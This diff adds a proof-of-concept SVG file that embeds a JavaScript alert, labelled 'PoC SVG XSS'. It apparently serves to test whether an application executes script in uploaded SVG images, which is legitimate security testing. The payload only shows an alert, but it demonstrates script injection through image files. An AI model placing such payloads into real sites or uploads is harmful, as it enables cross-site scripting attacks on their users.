@@ -1,0 +1,6 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="80">
+  <script type="text/javascript">
+    alert("hello");
+  </script>
+  <text x="10" y="40" font-size="16" fill="#333">PoC SVG XSS</text>
+</svg>
